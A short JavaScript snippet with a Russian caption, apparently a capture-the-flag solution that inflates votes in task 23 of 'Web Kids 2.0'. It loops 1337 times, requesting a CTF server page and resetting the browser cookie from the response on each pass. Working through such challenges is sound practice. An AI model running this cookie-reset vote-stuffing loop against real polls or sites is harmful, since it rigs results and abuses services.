for(var i=0; i< 1337; i++){  
var xhr = new XMLHttpRequest();  
xhr.open('GET' , 'http://kslweb1.spb.ctf.su/second/level23/', false);   
xhr.send();  
var text = xhr.responseText;  
console.log(text);  
document.cookie = text.split("\n")[4].substr(41);  
}  
^ Накрутка голосов в таске 23 веб кидс 2.0